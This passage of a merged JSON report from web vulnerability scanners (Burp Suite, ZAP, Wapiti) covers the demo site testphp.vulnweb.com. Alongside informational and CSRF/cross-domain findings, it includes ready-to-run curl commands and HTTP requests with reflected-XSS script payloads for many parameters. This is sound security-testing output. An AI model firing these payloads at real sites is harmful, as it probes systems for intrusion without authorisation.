                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "Base64 Disclosure",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "Base64 encoded data was disclosed by the application/web server. Note: in the interests of performance not all base64 strings in the response were analyzed individually, the entire response should be looked at by the analyst/security team/developer(s).",
                "solution": "Manually confirm that the Base64 data does not leak sensitive information, and that the data cannot be aggregated/used to exploit other vulnerabilities.",
                "reference": "https://projects.webappsec.org/w/page/13246936/Information%20Leakage",
                "tags": [
                    "https://owasp.org/Top10/A04_2021-Insecure_Design/",
                    "https://cwe.mitre.org/data/definitions/319.html",
                    "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1"
                ]
            }
        ],
        "Wapiti": [],
        "Uncategorized": []
    },
    "Uncategorized": {
        "Burp Suite": [],
        "ZAP": [],
        "Wapiti": [],
        "Uncategorized": [
            {
                "name": "Backup file",
                "type_index": 6291672,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "No description available.",
                "issue_background": "<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>",
                "remediation_background": "<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>",
                "paths": [
                    "/index.php",
                    "/index.php"
                ],
                "severity": "info"
            },
            {
                "alert": "Tech Detected - PHP",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "The following \"Programming languages\" technology was identified: PHP.\nDescribed as:\nPHP is a general-purpose scripting language used for web development.",
                "solution": "",
                "reference": "https://php.net",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/"
                ]
            },
            {
                "alert": "Tech Detected - Adobe Flash",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "The following \"Programming languages\" technology was identified: Adobe Flash.\nDescribed as:\nAdobe Flash is a multimedia software platform used for production of animations, rich web applications and embedded web browser video players.",
                "solution": "",
                "reference": "https://www.adobe.com/products/flashplayer",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/"
                ]
            },
            {
                "alert": "Tech Detected - Nginx",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "The following \"Web servers, Reverse proxies\" technology was identified: Nginx.\nDescribed as:\nNginx is a web server that can also be used as a reverse proxy, load balancer, mail proxy and HTTP cache.",
                "solution": "",
                "reference": "https://nginx.org/en",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/sitemap.xml"
                ]
            },
            {
                "alert": "Tech Detected - Ubuntu",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "The following \"Operating systems\" technology was identified: Ubuntu.\nDescribed as:\nUbuntu is a free and open-source operating system on Linux for the enterprise server, desktop, cloud, and IoT.",
                "solution": "",
                "reference": "https://www.ubuntu.com/server",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/"
                ]
            },
            {
                "alert": "Tech Detected - Cart Functionality",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "The following \"Ecommerce\" technology was identified: Cart Functionality.\nDescribed as:\nWebsites that have a shopping cart or checkout page, either using a known ecommerce platform or a custom solution.",
                "solution": "",
                "reference": "https://www.wappalyzer.com/technologies/ecommerce/cart-functionality",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/cart.php"
                ]
            },
            {
                "alert": "Tech Detected - DreamWeaver",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "The following \"Editors\" technology was identified: DreamWeaver.\nDescribed as:\nDreamweaver is a development tool for creating, publishing, and managing websites and mobile content.",
                "solution": "",
                "reference": "https://www.adobe.com/products/dreamweaver.html",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/"
                ]
            },
            {
                "alert": "Charset Mismatch (Header Versus Meta Content-Type Charset)",
                "risk": "Informational",
                "confidence": "Low",
                "description": "This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.\n\nAn attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.",
                "solution": "Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML.",
                "reference": "https://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection",
                "tags": [
                    "https://cwe.mitre.org/data/definitions/436.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1"
                ]
            },
            {
                "method": "GET",
                "path": "/artists.php",
                "info": "XSS vulnerability found via injection in the parameter artist",
                "level": 2,
                "parameter": "artist",
                "http_request": "GET /artists.php?artist=%3CScRiPt%3Ealert%28%27wgt1em5mve%27%29%3C%2FsCrIpT%3E HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/artists.php?artist=%3CScRiPt%3Ealert%28%27wgt1em5mve%27%29%3C%2FsCrIpT%3E\""
            },
            {
                "method": "GET",
                "path": "/hpp/",
                "info": "XSS vulnerability found via injection in the parameter pp",
                "level": 2,
                "parameter": "pp",
                "http_request": "GET /hpp/?pp=%22%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%27wvwizanbk8%27%29%3C%2FsCrIpT%3E HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/hpp/?pp=%22%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%27wvwizanbk8%27%29%3C%2FsCrIpT%3E\""
            },
            {
                "method": "GET",
                "path": "/hpp/params.php",
                "info": "XSS vulnerability found via injection in the parameter p",
                "level": 2,
                "parameter": "p",
                "http_request": "GET /hpp/params.php?p=%3CScRiPt%3Ealert%28%27wmzt3kdew5%27%29%3C%2FsCrIpT%3E&pp=12 HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/hpp/params.php?p=%3CScRiPt%3Ealert%28%27wmzt3kdew5%27%29%3C%2FsCrIpT%3E&pp=12\""
            },
            {
                "method": "GET",
                "path": "/hpp/params.php",
                "info": "XSS vulnerability found via injection in the parameter pp",
                "level": 2,
                "parameter": "pp",
                "http_request": "GET /hpp/params.php?p=valid&pp=%3CScRiPt%3Ealert%28%27wtjbvuj7ty%27%29%3C%2FsCrIpT%3E HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3CScRiPt%3Ealert%28%27wtjbvuj7ty%27%29%3C%2FsCrIpT%3E\""
            },
            {
                "method": "GET",
                "path": "/listproducts.php",
                "info": "XSS vulnerability found via injection in the parameter cat",
                "level": 2,
                "parameter": "cat",
                "http_request": "GET /listproducts.php?cat=%3CScRiPt%3Ealert%28%27wq3jp44svf%27%29%3C%2FsCrIpT%3E HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/listproducts.php?cat=%3CScRiPt%3Ealert%28%27wq3jp44svf%27%29%3C%2FsCrIpT%3E\""
            },
            {
                "method": "GET",
                "path": "/listproducts.php",
                "info": "XSS vulnerability found via injection in the parameter artist",
                "level": 2,
                "parameter": "artist",
                "http_request": "GET /listproducts.php?artist=%3CScRiPt%3Ealert%28%27wyj0nptgz1%27%29%3C%2FsCrIpT%3E HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/listproducts.php?artist=%3CScRiPt%3Ealert%28%27wyj0nptgz1%27%29%3C%2FsCrIpT%3E\""
            },
            {
                "method": "GET",
                "path": "/product.php",
                "info": "XSS vulnerability found via injection in the parameter pic",
                "level": 2,
                "parameter": "pic",
                "http_request": "GET /product.php?pic=%3CScRiPt%3Ealert%28%27w93pl6bo6e%27%29%3C%2FsCrIpT%3E HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/product.php?pic=%3CScRiPt%3Ealert%28%27w93pl6bo6e%27%29%3C%2FsCrIpT%3E\""
            },
            {
                "method": "POST",
                "path": "/guestbook.php",
                "info": "XSS vulnerability found via injection in the parameter name",
                "level": 2,
                "parameter": "name",
                "http_request": "POST /guestbook.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/guestbook.php\nContent-Type: application/x-www-form-urlencoded\n\nname=%3CScRiPt%3Ealert%28%27wzgbddcanp%27%29%3C%2FsCrIpT%3E&submit=add+message&text=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/guestbook.php\" -e \"http://testphp.vulnweb.com/guestbook.php\" -d \"name=%3CScRiPt%3Ealert%28%27wzgbddcanp%27%29%3C%2FsCrIpT%3E&submit=add+message&text=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/guestbook.php",
                "info": "XSS vulnerability found via injection in the parameter text",
                "level": 2,
                "parameter": "text",
                "http_request": "POST /guestbook.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/guestbook.php\nContent-Type: application/x-www-form-urlencoded\n\nname=anonymous+user&submit=add+message&text=%3CScRiPt%3Ealert%28%27wp7ihiiaua%27%29%3C%2FsCrIpT%3E",
                "curl_command": "curl \"http://testphp.vulnweb.com/guestbook.php\" -e \"http://testphp.vulnweb.com/guestbook.php\" -d \"name=anonymous+user&submit=add+message&text=%3CScRiPt%3Ealert%28%27wp7ihiiaua%27%29%3C%2FsCrIpT%3E\""
            },
            {
                "method": "POST",
                "path": "/search.php",
                "info": "XSS vulnerability found via injection in the parameter searchFor",
                "level": 2,
                "parameter": "searchFor",
                "http_request": "POST /search.php?test=query HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/\nContent-Type: application/x-www-form-urlencoded\n\nsearchFor=%3CScRiPt%3Ealert%28%27wkp8az5ap1%27%29%3C%2FsCrIpT%3E&goButton=go",
                "curl_command": "curl \"http://testphp.vulnweb.com/search.php?test=query\" -e \"http://testphp.vulnweb.com/\" -d \"searchFor=%3CScRiPt%3Ealert%28%27wkp8az5ap1%27%29%3C%2FsCrIpT%3E&goButton=go\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "XSS vulnerability found via injection in the parameter uuname",
                "level": 2,
                "parameter": "uuname",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=%3CScRiPt%3Ealert%28%22w82zvok6eo%22%29%3C%2FsCrIpT%3E&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=%3CScRiPt%3Ealert%28%22w82zvok6eo%22%29%3C%2FsCrIpT%3E&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "XSS vulnerability found via injection in the parameter urname",
                "level": 2,
                "parameter": "urname",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=default&upass=Letm3in_&upass2=Letm3in_&urname=%3CScRiPt%3Ealert%28%27wnug7j3y5b%27%29%3C%2FsCrIpT%3E&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=%3CScRiPt%3Ealert%28%27wnug7j3y5b%27%29%3C%2FsCrIpT%3E&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "XSS vulnerability found via injection in the parameter ucc",
                "level": 2,
                "parameter": "ucc",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=%3CScRiPt%3Ealert%28%27w05htragzg%27%29%3C%2FsCrIpT%3E&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=%3CScRiPt%3Ealert%28%27w05htragzg%27%29%3C%2FsCrIpT%3E&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "XSS vulnerability found via injection in the parameter uemail",
                "level": 2,
                "parameter": "uemail",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=%3CScRiPt%3Ealert%28%27wjfyjdjirt%27%29%3C%2FsCrIpT%3E&uphone=default&signup=signup&uaddress=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=%3CScRiPt%3Ealert%28%27wjfyjdjirt%27%29%3C%2FsCrIpT%3E&uphone=default&signup=signup&uaddress=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "XSS vulnerability found via injection in the parameter uphone",
                "level": 2,
                "parameter": "uphone",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=%3CScRiPt%3Ealert%28%27why0q0ocph%27%29%3C%2FsCrIpT%3E&signup=signup&uaddress=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=%3CScRiPt%3Ealert%28%27why0q0ocph%27%29%3C%2FsCrIpT%3E&signup=signup&uaddress=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "XSS vulnerability found via injection in the parameter uaddress",
                "level": 2,
                "parameter": "uaddress",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=%3CScRiPt%3Ealert%28%27wgb5y4x8g5%27%29%3C%2FsCrIpT%3E",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=%3CScRiPt%3Ealert%28%27wgb5y4x8g5%27%29%3C%2FsCrIpT%3E\""
            }
        ]
    },
    "Authentication/Session Issues": {
        "Burp Suite": [
            {
                "name": "Cleartext submission of password",
                "type_index": 3145984,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://testphp.vulnweb.com/userinfo.php</li></ul>The form contains the following password field:<ul><li>pass</li></ul>",
                "issue_background": "<p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>\n<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>",
                "remediation_background": "<p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p>",
                "paths": [
                    "/login.php",
                    "/signup.php"
                ],
                "severity": "high"
            }
        ],
        "ZAP": [
            {
                "alert": "Absence of Anti-CSRF Tokens",
                "risk": "Medium",
                "confidence": "Low",
                "description": "No Anti-CSRF tokens were found in a HTML submission form.\nA cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.\n\nCSRF attacks are effective in a number of situations, including:\n    * The victim has an active session on the target site.\n    * The victim is authenticated via HTTP auth on the target site.\n    * The victim is on the same local network as the target site.\n\nCSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.",
                "solution": "Phase: Architecture and Design\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\nFor example, use anti-CSRF packages such as the OWASP CSRFGuard.\n\nPhase: Implementation\nEnsure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.\n\nPhase: Architecture and Design\nGenerate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).\nNote that this can be bypassed using XSS.\n\nIdentify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.\nNote that this can be bypassed using XSS.\n\nUse the ESAPI Session Management control.\nThis control includes a component for CSRF.\n\nDo not use the GET method for any request that triggers a state change.\n\nPhase: Implementation\nCheck the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.",
                "reference": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\nhttps://cwe.mitre.org/data/definitions/352.html",
                "tags": [
                    "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery",
                    "https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html",
                    "https://cwe.mitre.org/data/definitions/352.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1"
                ]
            },
            {
                "alert": "Authentication Request Identified",
                "risk": "Informational",
                "confidence": "Low",
                "description": "The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to \"Auto-Detect\" then this rule will change the authentication to match the request identified.",
                "solution": "This is an informational alert rather than a vulnerability and so there is nothing to fix.",
                "reference": "https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/secured/newuser.php"
                ]
            }
        ],
        "Wapiti": [],
        "Uncategorized": []
    },
    "CORS/Cross-Domain Misconfiguration": {
        "Burp Suite": [
            {
                "name": "Flash cross-domain policy",
                "type_index": 2098176,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "The application publishes a Flash cross-domain policy which allows access from any domain.<br><br>Allowing access from all domains means that any domain can perform two-way interaction with this application. Unless the application consists entirely of unprotected public content, this policy is likely to present a significant security risk.",
                "issue_background": "<p>The Flash cross-domain policy controls whether Flash client components running on other domains can perform two-way interaction with the domain that publishes the policy. If another domain is allowed by the policy, then that domain can potentially attack users of the application. If a user is logged in to the application, and visits a domain allowed by the policy, then any malicious content running on that domain can potentially gain full access to the application within the security context of the logged in user.</p>\n<p>Even if an allowed domain is not overtly malicious in itself, security vulnerabilities within that domain could potentially be leveraged by a third-party attacker to exploit the trust relationship and attack the application that allows access. Any domains that are allowed by the Flash cross-domain policy should be reviewed to determine whether it is appropriate for the application to fully trust both their intentions and security posture. </p>",
                "remediation_background": "<p>Any inappropriate entries in the Flash cross-domain policy file should be removed.</p>",
                "paths": [
                    "/crossdomain.xml"
                ],
                "severity": "high"
            }
        ],
        "ZAP": [
            {
                "alert": "Cross-Domain Misconfiguration - Adobe - Read",
                "risk": "High",
                "confidence": "Medium",
                "description": "Flash/Silverlight based cross-site request forgery may be possible, due to a misconfiguration on the web server.",
                "solution": "Configure the crossdomain.xml file to restrict the list of domains that are allowed to make cross-domain read requests to this web server, using <allow-access-from domain=\"example.com\">. You should only grant access to \"*\" (all domains) if you are certain that this service does not host any access-controlled, personalized, or private data.",
